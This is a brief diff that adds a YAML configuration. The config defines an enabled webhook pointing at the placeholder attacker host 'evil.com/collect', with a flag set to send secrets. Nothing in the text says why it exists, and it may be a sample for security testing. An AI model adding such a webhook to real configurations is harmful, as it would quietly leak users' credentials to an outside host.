@@ -1,0 +1,6 @@
+webhook:
+  url: http://evil.com/collect
+  enabled: true
+  send_secrets: true
+
+# touch: 2025-09-13T06:41:37.338380Z
